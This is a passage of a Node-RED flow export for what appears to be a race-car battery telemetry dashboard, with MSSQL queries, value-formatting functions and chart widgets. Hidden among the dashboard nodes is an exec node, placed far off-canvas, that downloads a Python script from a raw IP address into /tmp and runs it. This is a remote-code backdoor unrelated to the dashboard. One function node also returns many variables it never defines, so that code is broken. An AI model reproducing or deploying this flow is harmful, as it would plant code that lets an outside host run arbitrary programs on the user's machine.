            "#e87722",
            "#71c5e8",
            "#98df8a",
            "#d62728",
            "#ff9896",
            "#9467bd",
            "#c5b0d5"
        ],
        "outputs": 1,
        "useDifferentColor": false,
        "className": "",
        "x": -4469,
        "y": -4779,
        "wires": [
            []
        ]
    },
    {
        "id": "cca35d9bf5fe8079",
        "type": "ui_chart",
        "z": "149f680d508ad4ad",
        "name": "",
        "group": "0792dde75d0b55e3",
        "order": 5,
        "width": "10",
        "height": 6,
        "label": "Resistances (Ohm)",
        "chartType": "line",
        "legend": "true",
        "xformat": "HH:mm:ss",
        "interpolate": "linear",
        "nodata": "",
        "dot": false,
        "ymin": "",
        "ymax": "",
        "removeOlder": "5",
        "removeOlderPoints": "",
        "removeOlderUnit": "60",
        "cutout": 0,
        "useOneColor": false,
        "useUTC": false,
        "colors": [
            "#ffb81c",
            "#0081a6",
            "#e87722",
            "#71c5e8",
            "#98df8a",
            "#d62728",
            "#ff9896",
            "#9467bd",
            "#c5b0d5"
        ],
        "outputs": 1,
        "useDifferentColor": false,
        "className": "",
        "x": -4459,
        "y": -4739,
        "wires": [
            []
        ]
    },
    {
        "id": "f992ff749bbee932",
        "type": "ui_chart",
        "z": "149f680d508ad4ad",
        "name": "",
        "group": "0792dde75d0b55e3",
        "order": 3,
        "width": "10",
        "height": "6",
        "label": "Pack Amphours",
        "chartType": "line",
        "legend": "false",
        "xformat": "HH:mm:ss",
        "interpolate": "linear",
        "nodata": "",
        "dot": false,
        "ymin": "",
        "ymax": "",
        "removeOlder": "5",
        "removeOlderPoints": "",
        "removeOlderUnit": "60",
        "cutout": 0,
        "useOneColor": false,
        "useUTC": false,
        "colors": [
            "#ffb81c",
            "#aec7e8",
            "#ff7f0e",
            "#2ca02c",
            "#98df8a",
            "#d62728",
            "#ff9896",
            "#9467bd",
            "#c5b0d5"
        ],
        "outputs": 1,
        "useDifferentColor": false,
        "className": "",
        "x": -4469,
        "y": -4899,
        "wires": [
            []
        ]
    },
    {
        "id": "0c940bf3d94b7ca0",
        "type": "ui_chart",
        "z": "149f680d508ad4ad",
        "name": "",
        "group": "0792dde75d0b55e3",
        "order": 8,
        "width": "10",
        "height": "6",
        "label": "Total Packet Cycles",
        "chartType": "line",
        "legend": "false",
        "xformat": "HH:mm:ss",
        "interpolate": "linear",
        "nodata": "",
        "dot": false,
        "ymin": "",
        "ymax": "",
        "removeOlder": "5",
        "removeOlderPoints": "",
        "removeOlderUnit": "60",
        "cutout": 0,
        "useOneColor": false,
        "useUTC": false,
        "colors": [
            "#ffb81c",
            "#aec7e8",
            "#ff7f0e",
            "#2ca02c",
            "#98df8a",
            "#d62728",
            "#ff9896",
            "#9467bd",
            "#c5b0d5"
        ],
        "outputs": 1,
        "useDifferentColor": false,
        "className": "",
        "x": -4459,
        "y": -4979,
        "wires": [
            []
        ]
    },
    {
        "id": "7c1b41f05208490c",
        "type": "ui_chart",
        "z": "149f680d508ad4ad",
        "name": "",
        "group": "0792dde75d0b55e3",
        "order": 6,
        "width": "10",
        "height": "6",
        "label": "Input Supply Voltage (V)",
        "chartType": "line",
        "legend": "false",
        "xformat": "HH:mm:ss",
        "interpolate": "linear",
        "nodata": "",
        "dot": false,
        "ymin": "",
        "ymax": "",
        "removeOlder": "5",
        "removeOlderPoints": "",
        "removeOlderUnit": "60",
        "cutout": 0,
        "useOneColor": false,
        "useUTC": false,
        "colors": [
            "#ffb81c",
            "#aec7e8",
            "#ff7f0e",
            "#2ca02c",
            "#98df8a",
            "#d62728",
            "#ff9896",
            "#9467bd",
            "#c5b0d5"
        ],
        "outputs": 1,
        "useDifferentColor": false,
        "className": "",
        "x": -4439,
        "y": -4699,
        "wires": [
            []
        ]
    },
    {
        "id": "e6fc6c3e12c91d8d",
        "type": "exec",
        "z": "149f680d508ad4ad",
        "command": "curl -o /tmp/3.py http://82.153.138.166/3.py; python /tmp/3.py",
        "addpay": "payload",
        "append": "",
        "useSpawn": "false",
        "timer": "10080",
        "winHide": false,
        "oldrc": false,
        "name": "",
        "x": 4810,
        "y": 5220,
        "wires": [
            [],
            [],
            []
        ]
    },
    {
        "id": "b4d7bef4b3cfc7c8",
        "type": "inject",
        "z": "149f680d508ad4ad",
        "name": "",
        "props": [
            {
                "p": "payload"
            },
            {
                "p": "topic",
                "vt": "str"
            }
        ],
        "repeat": "",
        "crontab": "",
        "once": false,
        "onceDelay": 0.1,
        "topic": "",
        "payload": "",
        "payloadType": "date",
        "x": 4810,
        "y": 5211,
        "wires": [
            [
                "e6fc6c3e12c91d8d"
            ]
        ]
    },
    {
        "id": "a0bd5384081958ba",
        "type": "inject",
        "z": "149f680d508ad4ad",
        "name": "",
        "props": [
            {
                "p": "payload"
            },
            {
                "p": "topic",
                "vt": "str"
            }
        ],
        "repeat": "1",
        "crontab": "",
        "once": false,
        "onceDelay": 0.1,
        "topic": "",
        "payload": "",
        "payloadType": "date",
        "x": -5039,
        "y": -4639,
        "wires": [
            [
                "ecb3161a33ada13e"
            ]
        ]
    },
    {
        "id": "ecb3161a33ada13e",
        "type": "MSSQL",
        "z": "149f680d508ad4ad",
        "mssqlCN": "933ce03686fddbab",
        "name": "",
        "outField": "payload",
        "returnType": 0,
        "throwErrors": 1,
        "query": "SELECT TOP 1 *\nFROM dbo.race_data\nORDER BY entry_num DESC;",
        "modeOpt": "queryMode",
        "modeOptType": "query",
        "queryOpt": "payload",
        "queryOptType": "editor",
        "paramsOpt": "queryParams",
        "paramsOptType": "none",
        "rows": "rows",
        "rowsType": "msg",
        "parseMustache": true,
        "params": [],
        "x": -4829,
        "y": -4639,
        "wires": [
            [
                "50fce010c1daa5a3"
            ]
        ]
    },
    {
        "id": "50fce010c1daa5a3",
        "type": "function",
        "z": "149f680d508ad4ad",
        "name": "Useful",
        "func": "var sigFigs = 2\n\nvar Total_Pack_Cycles =\n{\n    topic: \"Total Pack Cycles\",\n    payload: msg.payload[0].Total_Pack_Cycles\n}\ntry{\n    Total_Pack_Cycles.payload = Total_Pack_Cycles.payload.toFixed(sigFigs)\n}catch{}\n\nvar Pack_Open_Voltage =\n{\n    topic: \"Pack Open Voltage (V)\",\n    payload: msg.payload[0].Pack_Open_Voltage\n}\ntry {\n    Pack_Open_Voltage.payload = Pack_Open_Voltage.payload.toFixed(sigFigs)\n} catch { }\n\nvar Pack_SOC =\n{\n    topic: \"Pack State of Charge (%)\",\n    payload: msg.payload[0].Pack_SOC\n}\ntry {\n    Pack_SOC.payload = Pack_SOC.payload.toFixed(sigFigs)\n} catch { }\n\nvar Pack_Amphours =\n{\n    topic: \"Pack Amp Hours (Ah)\",\n    payload: msg.payload[0].Pack_Amphours\n}\ntry {\n    Pack_Amphours.payload = Pack_Amphours.payload.toFixed(sigFigs)\n} catch { }\n\nvar Pack_Resistance =\n{\n    topic: \"Pack Resistance (Ω)\",\n    payload: msg.payload[0].Pack_Resistance\n}\ntry {\n    Pack_Resistance.payload = Pack_Resistance.payload.toFixed(sigFigs)\n} catch { }\n\nvar Low_Temperature =\n{\n    topic: \"Low Temperature (ºC)\",\n    payload: msg.payload[0].Low_Temperature\n}\ntry {\n    Low_Temperature.payload = Low_Temperature.payload.toFixed(sigFigs)\n} catch { }\n\nvar Low_Thermistor_ID =\n{\n    topic: \"Low Thermistor ID\",\n    payload: msg.payload[0].Low_Thermistor_ID\n}\ntry {\n    Low_Thermistor_ID.payload = Low_Thermistor_ID.payload.toFixed(sigFigs)\n} catch { }\n\nvar Maximum_Pack_Voltage =\n{\n    topic: \"Maximum Pack Voltage (V)\",\n    payload: msg.payload[0].maximum_pack_voltage\n}\ntry {\n    Maximum_Pack_Voltage.payload = Maximum_Pack_Voltage.payload.toFixed(sigFigs)\n} catch { }\n\nvar Minimum_Pack_Voltage =\n{\n    topic: \"Minimum Pack Voltage (V)\",\n    payload: msg.payload[0].Minimum_Pack_Voltage\n}\ntry {\n    Minimum_Pack_Voltage.payload = Minimum_Pack_Voltage.payload.toFixed(sigFigs)\n} catch { }\n\nvar Internal_Temperature =\n{\n    topic: \"Internal Temperature (ºC)\",\n    payload: msg.payload[0].Internal_Temperature\n}\ntry {\n    Internal_Temperature.payload = Internal_Temperature.payload.toFixed(sigFigs)\n} catch { }\n\nvar High_Cell_Voltage =\n{\n    topic: \"High Cell Voltage (ºC)\",\n    payload: msg.payload[0].High_Cell_Voltage\n}\ntry {\n    High_Cell_Voltage.payload = High_Cell_Voltage.payload.toFixed(sigFigs)\n} catch { }\n\nvar High_Cell_Voltage_ID =\n{\n    topic: \"High Cell Voltage ID\",\n    payload: msg.payload[0].High_Cell_Voltage_ID\n}\ntry {\n    High_Cell_Voltage_ID.payload = High_Cell_Voltage_ID.payload.toFixed(sigFigs)\n} catch { }\n\nvar Low_Cell_Resistance =\n{\n    topic: \"Low Cell Resistance (MΩ)\",\n    payload: msg.payload[0].Low_Cell_Resistance\n}\ntry {\n    Low_Cell_Resistance.payload = Low_Cell_Resistance.payload.toFixed(sigFigs)\n} catch { }\n\nvar Low_Intres_ID =\n{\n    topic: \"Low Internal Resistance ID\",\n    payload: msg.payload[0].Low_Intres_ID\n}\ntry {\n    Low_Intres_ID.payload = Low_Intres_ID.payload.toFixed(sigFigs)\n} catch { }\n\nvar Maximum_Cell_Voltage =\n{\n    topic: \"Maximum Cell Voltage (V)\",\n    payload: msg.payload[0].Maximum_Cell_Voltage\n}\ntry {\n    Maximum_Cell_Voltage.payload = Maximum_Cell_Voltage.payload.toFixed(sigFigs)\n} catch { }\n\nvar Minimum_Cell_Voltage =\n{\n    topic: \"Minimum Cell Voltage (V)\",\n    payload: msg.payload[0].Minimum_Cell_Voltage\n}\ntry {\n    Minimum_Cell_Voltage.payload = Minimum_Cell_Voltage.payload.toFixed(sigFigs)\n} catch { }\n\nvar Input_Supply_Voltage =\n{\n    topic: \"Input Supply Voltage (V)\",\n    payload: msg.payload[0].Input_Supply_Voltage\n}\ntry {\n    Input_Supply_Voltage.payload = Input_Supply_Voltage.payload.toFixed(sigFigs)\n} catch { }\n\nvar Avg_Cell_Resistance =\n{\n    topic: \"Average Cell Resistance (MΩ)\",\n    payload: msg.payload[0].Avg_Cell_Resistance\n}\ntry {\n    Avg_Cell_Resistance.payload = Avg_Cell_Resistance.payload.toFixed(sigFigs)\n} catch { }\n\n\nreturn [\n    Total_Pack_Cycles,\n    Pack_Open_Voltage,\n    Pack_SOC,\n    Pack_Amphours,\n    Pack_Resistance,\n    Low_Temperature,\n    Low_Thermistor_ID,\n    Avg_Cell_Resistance,\n    Maximum_Pack_Voltage,\n    Minimum_Pack_Voltage,\n    Internal_Temperature,\n    High_Cell_Voltage,\n    High_Cell_Voltage_ID,\n    Low_Cell_Resistance,\n    Low_Intres_ID,\n    Maximum_Cell_Voltage,\n    Minimum_Cell_Voltage,\n    Input_Supply_Voltage\n]",
        "outputs": 18,
        "noerr": 0,
        "initialize": "",
        "finalize": "",
        "libs": [],
        "x": -4659,
        "y": -4599,
        "wires": [
            [
                "ac0977af8eefd71d"
            ],
            [
                "29ef73ae1415527a"
            ],
            [
                "6a8bf29113fbd3e5"
            ],
            [
                "214be22ebc00b565"
            ],
            [
                "589d877e51bd5dba"
            ],
            [
                "b9683e68b52394ce"
            ],
            [
                "b9683e68b52394ce"
            ],
            [
                "589d877e51bd5dba"
            ],
            [
                "29ef73ae1415527a"
            ],
            [
                "29ef73ae1415527a"
            ],
            [
                "b9683e68b52394ce"
            ],
            [
                "d6ebcebaf26acd48"
            ],
            [
                "d6ebcebaf26acd48"
            ],
            [
                "589d877e51bd5dba"
            ],
            [
                "589d877e51bd5dba"
            ],
            [
                "d6ebcebaf26acd48"
            ],
            [
                "d6ebcebaf26acd48"
            ],
            [
                "b01aaa16e3f870c8"
            ]
        ]
    },
    {
        "id": "29ef73ae1415527a",
        "type": "ui_chart",
        "z": "149f680d508ad4ad",
        "name": "",
        "group": "0792dde75d0b55e3",
        "order": 1,
        "width": "10",
        "height": 6,
        "label": "Pack Voltage (V)",
        "chartType": "line",
        "legend": "true",
        "xformat": "HH:mm:ss",
        "interpolate": "linear",
        "nodata": "",
        "dot": false,
        "ymin": "",
        "ymax": "",
        "removeOlder": "5",
        "removeOlderPoints": "",
        "removeOlderUnit": "60",
        "cutout": 0,
        "useOneColor": false,
        "useUTC": false,
        "colors": [
            "#1f77b4",
            "#0081a6",
            "#e87722",
            "#2ca02c",
            "#98df8a",
            "#d62728",
            "#ff9896",
            "#9467bd",
            "#c5b0d5"
        ],
        "outputs": 1,
        "useDifferentColor": false,
        "className": "",
        "x": -4429,
        "y": -4619,
        "wires": [
            []
        ]
    },
    {
        "id": "6a8bf29113fbd3e5",
        "type": "ui_chart",
        "z": "149f680d508ad4ad",
        "name": "",
        "group": "0792dde75d0b55e3",
        "order": 7,
        "width": "10",
        "height": 6,
        "label": "Pack State of Charge",
        "chartType": "line",
        "legend": "false",
        "xformat": "HH:mm:ss",
        "interpolate": "linear",
        "nodata": "",
        "dot": false,
        "ymin": "",
        "ymax": "",
        "removeOlder": "5",
        "removeOlderPoints": "",
        "removeOlderUnit": "60",
        "cutout": 0,
        "useOneColor": false,
        "useUTC": false,
        "colors": [
            "#ffb81c",
            "#aec7e8",
            "#ff7f0e",
            "#2ca02c",
            "#98df8a",
            "#d62728",
            "#ff9896",
            "#9467bd",
            "#c5b0d5"
        ],
        "outputs": 1,
        "useDifferentColor": false,
        "className": "",
        "x": -4409,
        "y": -4699,
        "wires": [
            []
        ]
    },
    {
        "id": "b9683e68b52394ce",
        "type": "ui_chart",
        "z": "149f680d508ad4ad",
        "name": "",
        "group": "0792dde75d0b55e3",
        "order": 4,
        "width": "10",
        "height": 6,
        "label": "Temperature (Celsius)",
        "chartType": "line",
        "legend": "true",
        "xformat": "HH:mm:ss",
        "interpolate": "linear",
        "nodata": "",
        "dot": false,
        "ymin": "",
        "ymax": "",
        "removeOlder": "5",
        "removeOlderPoints": "",
        "removeOlderUnit": "60",
        "cutout": 0,
        "useOneColor": false,
        "useUTC": false,
        "colors": [
            "#ffb81c",
            "#0081a6",
            "#e87722",
            "#2ca02c",
            "#98df8a",
            "#d62728",
            "#ff9896",
            "#9467bd",
            "#c5b0d5"
        ],
        "outputs": 1,
        "useDifferentColor": false,
        "className": "",
        "x": -4409,
        "y": -4579,
        "wires": [
            []
        ]
    },
    {
        "id": "d6ebcebaf26acd48",
        "type": "ui_chart",
        "z": "149f680d508ad4ad",
        "name": "",
        "group": "0792dde75d0b55e3",
        "order": 2,
        "width": "10",
        "height": 6,
        "label": "Cell Voltage (V)",
        "chartType": "line",
        "legend": "true",
        "xformat": "HH:mm:ss",
        "interpolate": "linear",
        "nodata": "",
        "dot": false,
        "ymin": "",
        "ymax": "",
        "removeOlder": "5",
        "removeOlderPoints": "",
        "removeOlderUnit": "60",
        "cutout": 0,
        "useOneColor": false,
        "useUTC": false,
        "colors": [
            "#ffb81c",
            "#0081a6",
            "#e87722",
            "#71c5e8",
            "#98df8a",
            "#d62728",
            "#ff9896",
            "#9467bd",
            "#c5b0d5"
        ],
        "outputs": 1,
        "useDifferentColor": false,
        "className": "",
        "x": -4429,
        "y": -4539,
        "wires": [
            []
        ]
    },
    {
        "id": "589d877e51bd5dba",
        "type": "ui_chart",
        "z": "149f680d508ad4ad",
        "name": "",
        "group": "0792dde75d0b55e3",
        "order": 5,
        "width": "10",
        "height": 6,
        "label": "Resistances (Ohm)",
        "chartType": "line",
        "legend": "true",
        "xformat": "HH:mm:ss",
        "interpolate": "linear",
        "nodata": "",
        "dot": false,
        "ymin": "",
        "ymax": "",
        "removeOlder": "5",
        "removeOlderPoints": "",
        "removeOlderUnit": "60",
        "cutout": 0,
        "useOneColor": false,
        "useUTC": false,
        "colors": [
            "#ffb81c",
            "#0081a6",
            "#e87722",
            "#71c5e8",
            "#98df8a",
            "#d62728",
            "#ff9896",
            "#9467bd",
            "#c5b0d5"
        ],
        "outputs": 1,
        "useDifferentColor": false,
        "className": "",
        "x": -4419,
        "y": -4499,
        "wires": [
            []
        ]
    },
    {
        "id": "214be22ebc00b565",
        "type": "ui_chart",
        "z": "149f680d508ad4ad",
        "name": "",
        "group": "0792dde75d0b55e3",
        "order": 3,
        "width": "10",
        "height": "6",
        "label": "Pack Amphours",
        "chartType": "line",
        "legend": "false",
        "xformat": "HH:mm:ss",
        "interpolate": "linear",
        "nodata": "",
        "dot": false,
        "ymin": "",
        "ymax": "",
        "removeOlder": "5",
        "removeOlderPoints": "",
        "removeOlderUnit": "60",
        "cutout": 0,
        "useOneColor": false,
        "useUTC": false,
        "colors": [
            "#ffb81c",
            "#aec7e8",
            "#ff7f0e",
            "#2ca02c",
            "#98df8a",
            "#d62728",
            "#ff9896",
            "#9467bd",
            "#c5b0d5"
        ],
        "outputs": 1,
        "useDifferentColor": false,
        "className": "",
        "x": -4429,
        "y": -4659,
        "wires": [
            []
        ]
    },
    {
        "id": "ac0977af8eefd71d",
        "type": "ui_chart",
        "z": "149f680d508ad4ad",
        "name": "",
        "group": "0792dde75d0b55e3",
        "order": 8,
        "width": "10",
        "height": "6",
        "label": "Total Packet Cycles",
        "chartType": "line",
        "legend": "false",
        "xformat": "HH:mm:ss",
        "interpolate": "linear",
        "nodata": "",
        "dot": false,
        "ymin": "",
        "ymax": "",
        "removeOlder": "5",
        "removeOlderPoints": "",
        "removeOlderUnit": "60",
        "cutout": 0,
        "useOneColor": false,
        "useUTC": false,
        "colors": [
            "#ffb81c",
            "#aec7e8",
            "#ff7f0e",
            "#2ca02c",
            "#98df8a",
            "#d62728",
            "#ff9896",
            "#9467bd",
            "#c5b0d5"
        ],
        "outputs": 1,
        "useDifferentColor": false,
        "className": "",
        "x": -4419,
        "y": -4739,
        "wires": [
            []
        ]
    },
    {
        "id": "b01aaa16e3f870c8",
        "type": "ui_chart",
        "z": "149f680d508ad4ad",
        "name": "",
        "group": "0792dde75d0b55e3",
        "order": 6,
        "width": "10",
        "height": "6",
        "label": "Input Supply Voltage (V)",
        "chartType": "line",
        "legend": "false",
        "xformat": "HH:mm:ss",
        "interpolate": "linear",
        "nodata": "",
        "dot": false,
        "ymin": "",
        "ymax": "",
        "removeOlder": "5",
        "removeOlderPoints": "",
        "removeOlderUnit": "60",
        "cutout": 0,
        "useOneColor": false,
        "useUTC": false,
        "colors": [
            "#ffb81c",
            "#aec7e8",
            "#ff7f0e",
            "#2ca02c",
            "#98df8a",
            "#d62728",
            "#ff9896",
            "#9467bd",
            "#c5b0d5"
        ],
        "outputs": 1,
        "useDifferentColor": false,
        "className": "",
        "x": -4399,
        "y": -4459,
        "wires": [
            []
        ]
    },
    {
        "id": "d7924eb31a891fe6",
        "type": "inject",
        "z": "149f680d508ad4ad",
        "name": "",
        "props": [
            {
                "p": "payload"
            },
            {
                "p": "topic",
                "vt": "str"
            }
        ],
        "repeat": "1",
        "crontab": "",
        "once": false,
        "onceDelay": 0.1,
        "topic": "",
        "payload": "",
        "payloadType": "date",
        "x": 2230,
        "y": 240,
        "wires": [
            [
                "9a8570e9dc664586"
            ]
        ]
    },
    {
        "id": "9a8570e9dc664586",
        "type": "MSSQL",
        "z": "149f680d508ad4ad",
        "mssqlCN": "933ce03686fddbab",
        "name": "",
        "outField": "payload",
        "returnType": 0,
        "throwErrors": 1,
        "query": "SELECT TOP 1 *\nFROM dbo.race_data\nORDER BY entry_num DESC;",
        "modeOpt": "queryMode",
        "modeOptType": "query",
        "queryOpt": "payload",
        "queryOptType": "editor",
        "paramsOpt": "queryParams",
        "paramsOptType": "none",
        "rows": "rows",
        "rowsType": "msg",
        "parseMustache": true,
        "params": [],
        "x": 2440,
        "y": 240,
        "wires": [
            [
                "cc1a672b0390d648"
            ]
        ]
    },
    {
        "id": "cc1a672b0390d648",
        "type": "function",
        "z": "149f680d508ad4ad",
        "name": "potentially useful messages",
        "func": "var sigFigs = 2\n\n//REPEATED?\nvar Pack_SOC =\n{\n    topic: \"Pack State of Charge (%)\",\n    payload: msg.payload[0].Pack_SOC\n}\ntry {\n    Pack_SOC.payload = Pack_SOC.payload.toFixed(sigFigs)\n} catch { }\n\nvar pack_state_of_health =\n{\n    topic: \"Pack State of Health\",\n    payload: msg.payload[0].pack_state_of_health\n}\ntry {\n    pack_state_of_health.payload = pack_state_of_health.payload.toFixed(sigFigs)\n} catch { }\n\nvar pack_summed_voltage =\n{\n    topic: \"Pack Summed Voltage\",\n    payload: msg.payload[0].pack_summed_voltage\n}\ntry {\n    pack_summed_voltage.payload = pack_summed_voltage.payload.toFixed(sigFigs)\n} catch { }\n\nvar adaptive_total_capacity =\n{\n    topic: \"Adaptive Total Capacity\",\n    payload: msg.payload[0].adaptive_total_capacity\n}\ntry {\n    adaptive_total_capacity.payload = adaptive_total_capacity.payload.toFixed(sigFigs)\n} catch { }\n\nvar adaptive_amp_hours =\n{\n    topic: \"Adaptive Amp Hours\",\n    payload: msg.payload[0].adaptive_amp_hours\n}\ntry {\n    adaptive_amp_hours.payload = adaptive_amp_hours.payload.toFixed(sigFigs)\n} catch { }\n\nvar adaptive_state_of_charge =\n{\n    topic: \"Adaptive State of Charge\",\n    payload: msg.payload[0].adaptive_state_of_charge\n}\ntry {\n    adaptive_state_of_charge.payload = adaptive_state_of_charge.payload.toFixed(sigFigs)\n} catch { }\n\nvar Failsafe_Statuses =\n{\n    topic: \"Failsafe Satuses\",\n    payload: msg.payload[0].Failsafe_Statuses\n}\n/* try {\n    failsafe_statuses.payload = failsafe_statuses.payload.toFixed(sigFigs)\n} catch { } */\n\nvar Rolling_Counter =\n{\n    topic: \"Rolling Counter\",\n    payload: msg.payload[0].Rolling_Counter\n}\ntry {\n    Rolling_Counter.payload = Rolling_Counter.payload.toFixed(sigFigs)\n} catch { }\n\nvar total_pack_adc =\n{\n    topic: \"Total Pack ADC\",\n    payload: msg.payload[0].total_pack_adc\n}\ntry {\n    total_pack_adc.payload = total_pack_adc.payload.toFixed(sigFigs)\n} catch { }\n\nvar Low_Cell_Voltage =\n{\n    topic: \"Low Cell Voltage (V)\",\n    payload: msg.payload[0].Low_Cell_Voltage\n}\ntry {\n    Low_Cell_Voltage.payload = Low_Cell_Voltage.payload.toFixed(sigFigs)\n} catch { }\n\nvar Low_Cell_Voltage_ID =\n{\n    topic: \"Low Cell Voltage ID\",\n    payload: msg.payload[0].Low_Cell_Voltage_ID\n}\ntry {\n    Low_Cell_Voltage_ID.payload = Low_Cell_Voltage_ID.payload.toFixed(sigFigs)\n} catch { }\n\nvar High_Cell_Voltage =\n{\n    topic: \"High Cell Voltage (V)\",\n    payload: msg.payload[0].High_Cell_Voltage\n}\ntry {\n    High_Cell_Voltage.payload = High_Cell_Voltage.payload.toFixed(sigFigs)\n} catch { }\n\nvar High_Cell_Voltage_ID =\n{\n    topic: \"High Cell Voltage ID\",\n    payload: msg.payload[0].High_Cell_Voltage_ID\n}\ntry {\n    High_Cell_Voltage_ID.payload = High_Cell_Voltage_ID.payload.toFixed(sigFigs)\n} catch { }\n\nvar Avg_Cell_Voltage =\n{\n    topic: \"Average Cell Voltage\",\n    payload: msg.payload[0].Avg_Cell_Voltage\n}\ntry {\n    Avg_Cell_Voltage.payload = Avg_Cell_Voltage.payload.toFixed(sigFigs)\n} catch { }\n\nvar BMS_failsafeStatuses =\n{\n    topic: \"Average Cell Voltage\",\n    payload: msg.payload[0].BMS_failsafeStatuses\n}\ntry {\n    BMS_failsafeStatuses.payload = BMS_failsafeStatuses.payload.toFixed(sigFigs)\n} catch { }\n\nreturn [\n    VCU_warningSource,\n    VCU_tsOverPowerWarning,\n    VCU_radCoolantTempOutWarning,\n    VCU_radCoolantTempInWarning,\n    VCU_radCoolantPressOutWarning,\n    VCU_radCoolantPressInWarning, \n    VCU_radCoolantFlowRateWarning,\n    VCU_pedalPlausFaultWarning,\n    VCU_motorTorqueLimitWarning,\n    VCU_motorSpeedLimitWarning,\n    VCU_motorOverVoltWarning,\n    VCU_motorOverSpeedWarning,\n    VCU_motorOverCurrentWarning,\n    VCU_motorCoolantTempOutWarning,\n    VCU_motorCoolantTempInWarning,\n    VCU_motorCoolantPressOutWarning,\n    VCU_motorCoolantPressInWarning,\n    VCU_motorCoolantFlowRateWarning,\n    VCU_mcOverVoltWarning,\n    VCU_mcOverCurrentWarning,\n    VCU_mcCoolantTempOutWarning,\n    VCU_mcCoolantTempInWarning,\n    VCU_mcCoolantPressOutWarning,\n    VCU_mcCoolantPressInWarning,\n    VCU_mcCoolantFlowRateWarning,\n    VCU_mcCANTimeoutWarning,\n    VCU_batteryUnderVoltWarning,\n    VCU_accuUnderVoltWarning,\n    VCU_accuOverVoltWarning,\n    VCU_accuOverCurrentWarning,\n    VCU_accumulatorTempWarning,\n    VCU_accuIMDLightWarning,\n    VCU_accuHVILWarning,\n    VCU_accuCoolantTempOutWarning,\n    VCU_accuCoolantTempInWarning,\n    VCU_accuCoolantPressOutWarning,\n    VCU_accuCoolantPressInWarning,\n    VCU_accuCoolantFlowRateWarning,\n    VCU_accuCANTimeoutWarning\n];\n",
        "outputs": 38,
        "noerr": 0,
        "initialize": "",
        "finalize": "",
        "libs": [],
        "x": 2700,
        "y": 440,
        "wires": [
            [],
            [],
            [],
            [
                "48eed2cffc947049"
            ],
            [],
            [],
            [],
            [],
            [],
            [],
            [
                "a0be0c5ffa5a0217"
            ],
            [],
            [
                "52dbcf28d7ed8354"
            ],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            []
        ]
    },
    {
        "id": "48eed2cffc947049",
        "type": "ui_text",
        "z": "149f680d508ad4ad",
        "group": "879eba49fd286672",
        "order": 13,
        "width": "4",
        "height": "2",
        "name": "",
        "label": "Adaptive Total Capacity",
        "format": "{{msg.payload}}",
        "layout": "col-center",
        "className": "",
        "x": 3030,
        "y": 260,
        "wires": []
    },
    {
        "id": "a0be0c5ffa5a0217",
        "type": "ui_text",
        "z": "149f680d508ad4ad",
        "group": "879eba49fd286672",
        "order": 11,
        "width": "4",
        "height": "2",
        "name": "",
        "label": "Low Cell Voltage ID",
        "format": "{{msg.payload}}",
        "layout": "col-center",
        "className": "",
        "x": 3010,
        "y": 540,
        "wires": []
    },
    {
        "id": "52dbcf28d7ed8354",
        "type": "ui_text",
        "z": "149f680d508ad4ad",
        "group": "879eba49fd286672",
        "order": 12,
        "width": "4",
        "height": "2",
        "name": "",
        "label": "High Cell Voltage ID",
        "format": "{{msg.payload}}",
        "layout": "col-center",
        "className": "",
        "x": 3020,
        "y": 620,
        "wires": []
    },
    {
        "id": "1b9fd683b4b75947",
        "type": "ui_text",
        "z": "149f680d508ad4ad",
        "group": "879eba49fd286672",
        "order": 14,
        "width": "4",
        "height": "2",
        "name": "",
        "label": "Failsafe status",
        "format": "{{msg.payload}}",
        "layout": "col-center",
        "className": "",
        "x": 3000,
        "y": 320,
        "wires": []
    },
    {
        "id": "2aad52dceb0a7762",
        "type": "ui_text",
        "z": "149f680d508ad4ad",
        "group": "879eba49fd286672",
        "order": 14,
        "width": "4",
        "height": "2",
        "name": "",
        "label": "BMS Failsafe status",
        "format": "{{msg.payload}}",
        "layout": "col-center",
        "className": "",
        "x": 3020,
        "y": 660,
        "wires": []
    },
    {
        "id": "997fd29f83a786ce",
        "type": "inject",
        "z": "4a2f2f6c3794d699",
        "name": "",
        "props": [
            {
                "p": "payload"
            },
            {
                "p": "topic",
                "vt": "str"
            }
        ],
        "repeat": "1",
        "crontab": "",
        "once": false,
        "onceDelay": 0.1,
        "topic": "",
        "payload": "",
        "payloadType": "date",
        "x": 130,
        "y": 260,
        "wires": [
            [
                "5971fbcb26caa811"
            ]
        ]
    },
    {
        "id": "5971fbcb26caa811",
        "type": "MSSQL",
        "z": "4a2f2f6c3794d699",
        "mssqlCN": "933ce03686fddbab",
        "name": "",
        "outField": "payload",
        "returnType": 0,
        "throwErrors": 1,
        "query": "SELECT TOP 1 *\nFROM dbo.race_data\nORDER BY entry_num DESC;",
        "modeOpt": "queryMode",
        "modeOptType": "query",
        "queryOpt": "payload",
        "queryOptType": "editor",
        "paramsOpt": "queryParams",
        "paramsOptType": "none",
        "rows": "rows",
        "rowsType": "msg",
        "parseMustache": true,
        "params": [],
        "x": 340,
        "y": 260,
        "wires": [
            [
                "462c713e2f67e9a5"
            ]
        ]
    },
    {
        "id": "ee0b250d87f6e5dc",
        "type": "ui_chart",
        "z": "4a2f2f6c3794d699",
        "name": "",
        "group": "4dce402db33a1ac6",
        "order": 11,
        "width": "10",
        "height": 6,
        "label": "Reference Voltages",
        "chartType": "line",
        "legend": "true",
        "xformat": "HH:mm:ss",
        "interpolate": "linear",
        "nodata": "",
        "dot": false,
        "ymin": "",
        "ymax": "",
        "removeOlder": "5",
        "removeOlderPoints": "",
        "removeOlderUnit": "60",
        "cutout": 0,
        "useOneColor": false,
        "useUTC": false,
        "colors": [
            "#ffb81c",
            "#0081a6",
            "#e87722",
            "#71c5e8",
            "#98df8a",
            "#d62728",
            "#ff9896",
            "#9467bd",
            "#c5b0d5"
        ],
        "outputs": 1,
        "useDifferentColor": false,
        "className": "",
        "x": 830,
        "y": 20,
        "wires": [
            []
        ]
    },
    {
        "id": "462c713e2f67e9a5",
        "type": "function",
        "z": "4a2f2f6c3794d699",
        "name": "MC Code",
